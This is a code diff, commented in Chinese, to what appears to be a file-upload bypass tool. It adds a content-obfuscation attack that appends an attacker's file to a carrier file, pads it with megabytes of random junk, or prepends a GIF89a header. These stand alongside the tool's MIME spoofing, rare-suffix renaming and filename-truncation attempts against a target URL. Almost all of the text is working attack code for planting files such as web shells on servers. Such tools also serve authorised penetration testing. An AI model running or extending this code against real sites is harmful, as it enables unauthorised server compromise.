@@ -40,13 +40,35 @@ class General:
         尝试攻击并检查输出
         :return:
         '''
+        self.prepare()   # 设置通用参数
         p1 = self.mimeBypass()   # MIME绕过
         c1 = self.Comman.checkResult(self.initUrls, p1)
         self.end(check=c1, stop=self.stop)
-        p2 = self.rareSuffixBypass()  # 同义后缀名绕过
-        p3 = self.truncatedBypass()  # 截断上传
+        self.rareSuffixBypass()  # 同义后缀名绕过
+        self.truncatedBypass()  # 截断上传绕过
+        self.confuseBypass()    # 文件内容检测绕过
         self.end(stop=True)
         return
+
+    def prepare(self):
+        '''
+        解析通用设置
+        :return:
+        '''
+        if self.args.mime != '':   # 预设content-type
+            self.p_ct = self.args.mime
+        elif self.args.ct != '':
+            self.p_ct = self.Comman.setContentType(self.args.ct)
+        else:
+            self.p_ct = 'image/png'
+        if self.args.attach != '':  # 使用attach文件上传
+            self.p_file = self.args.attach
+            self.p_filename = self.Comman.getFilename(self.args.attach)
+        else:
+            self.p_file = self.args.f
+            self.p_filename = self.Comman.getFilename(self.args.f)
+        return
+
 
     def end(self, check=False, stop=False):
         # 判断是否结束
@@ -104,22 +126,14 @@ class General:
             fns.append(f)
         return fns
 
-    def mimeBypass(self, ct='image/jpg'):
+    def mimeBypass(self):
         '''
         MIME绕过后端检测
         :return:
         '''
         print(blue('[ schedule ]') + cyan('利用MIME绕过测试'))
-        if self.args.mime != '':
-            ct = self.args.mime
-        elif self.args.ct != '':
-            ct = self.Comman.setContentType(self.args.ct)
-        print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(ct))
-        if self.args.attach != '':  # 使用attach文件上传
-            file = self.args.attach
-        else:
-            file = self.args.f
-        files = self.setFiles(self.args.field, file=file, ct=ct)
+        print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(self.p_ct))
+        files = self.setFiles(self.args.field, file=self.p_file, ct=self.p_ct)
         res = self.Comman.upload(self.args.u, files, data=self.data)
         return res
 
@@ -128,23 +142,17 @@ class General:
         同义后缀名替换
         :return:
         '''
-        if self.args.attach != '':  # 存在attach文件，获取后缀名备用
-            file = self.args.attach
-            filename = self.Comman.getFilename(self.args.attach)
-        else:
-            file = self.args.f
-            filename = self.Comman.getFilename(self.args.f)
-        suffix = self.getSuffix(filename)
+        suffix = self.getSuffix(self.p_filename)    # 获取文件后缀名
         if suffix == False:
             return
-        fns = self.fuzzRareSuffix(suffix, filename)   # 同义后缀名替换
+        fns = self.fuzzRareSuffix(suffix, self.p_filename)   # 同义后缀名替换
         if fns != []:
             print(blue('[ schedule ]') + cyan('利用不同的拓展名及文件名大小写混淆绕过'))
             for f in fns:
                 print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
                 files = self.setFiles(
                     field=self.args.field,
-                    file=file,
+                    file=self.p_file,
                     filename=f
                 )
                 res = self.Comman.upload(self.args.u, files, self.data)
@@ -157,28 +165,45 @@ class General:
         尝试以特殊字符截断、系统解析漏洞截断bypass
         :return:
         '''
-        if self.args.attach != '':  # 存在attach文件，获取后缀名备用
-            file = self.args.attach
-            filename = self.Comman.getFilename(self.args.attach)
-        else:
-            file = self.args.f
-            filename = self.Comman.getFilename(self.args.f)
-        suffix = self.getSuffix(filename)
-        fns = self.addTruncated(filename)
-        fns += self.longFilename(suffix)
+        suffix = self.getSuffix(self.p_filename)    # 获取文件后缀名
+        fns = self.addTruncated(self.p_filename)    # 添加特殊结尾
+        fns += self.longFilename(suffix)     # 构造超长文件名
         if fns != []:
             print(blue('[ schedule ]') + cyan('尝试以特殊字符截断、系统解析漏洞截断bypass'))
             for f in fns:
                 print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
                 files = self.setFiles(
                     field=self.args.field,
-                    file=file,
+                    file=self.p_file,
                     filename=f
                 )
                 res = self.Comman.upload(self.args.u, files, self.data)
                 check = self.Comman.checkResult(self.initUrls, res)
                 self.end(check=check, stop=self.stop)
         return
+
+    def confuseBypass(self):
+        '''
+        文件内容混淆
+        文件合并上传绕过
+        :return:
+        '''
+        Files = []
+        if self.args.attach != '':  # 存在attach文件，合并至file
+            attach = self.args.attach
+            Files += self.mergeFiles(
+                field=self.args.field,
+                file=self.args.f,
+                attach=attach
+            )
+        if Files != []:
+            print(blue('[ schedule ]') + cyan('尝试以内容混淆绕过检测'))
+            for f in Files:
+                res = self.Comman.upload(self.args.u, f, self.data)
+                check = self.Comman.checkResult(self.initUrls, res)
+                self.end(check=check, stop=self.stop)
+        return
+
 
     def getSuffix(self, filename):
         # 获取文件名后缀
@@ -189,22 +214,62 @@ class General:
             print(red('[ Error ]') + yellow('获取文件后缀名失败'))
             return False
 
-    def setAttachFiles(self, field, file, attach, ct='', other={}):
-        # 设置attach文件
+    def mergeFiles(self, field, file, attach):
+        # 合并文件内容
+        Files = []
         try:
             files = {
                 field: (
-                attach,
-                open(file, 'rb'),
-                ct,
-                other
+                attach,   # 文件名使用attach的
+                open(file, 'rb').read() + open(attach, 'rb').read(),  # attach内容附加在file后
+                self.p_ct
             )
             }
-            # print(files)
-            return files
+            Files.append(files.copy())
+            files = {
+                field: (
+                    file,  # 文件名使用file的
+                    open(file, 'rb').read() + open(attach, 'rb').read()  # attach内容附加在file后
+                )
+            }
+            Files.append(files.copy())
         except:
-            print(red('[ Error ]') + yellow('读取文件失败'))
-            sys.exit()
+            print(red('[ Error ]') + yellow('合并文件失败'))
+        try:
+            ran_str = self.Comman.getRandomStr(10000000)
+            files = {
+                field: (
+                    attach,  # 文件名使用attach的
+                    ran_str.encode() + open(attach, 'rb').read(),
+                    self.p_ct
+                )
+            }
+            Files.append(files.copy())
+            files = {
+                field: (
+                    file,  # 文件名使用file的
+                    ran_str.encode() + open(attach, 'rb').read()
+                )
+            }
+            Files.append(files.copy())
+        except:
+            print(red('[ Error ]') + yellow('垃圾内容填充失败'))
+        try:
+            files = {
+                field: (
+                file,   # 文件名使用file的
+                'GIF89a'.encode() + open(attach, 'rb').read()  # 添加文件头
+            )
+            }
+            Files.append(files.copy())
+        except:
+            print(red('[ Error ]') + yellow('添加文件头失败'))
+        return Files
+
+
+    def confuseFile(self, attach):
+        # 文件内容混淆
+        pass
 
 
     def setFiles(self, field, file, filename='', ct='', other={}):
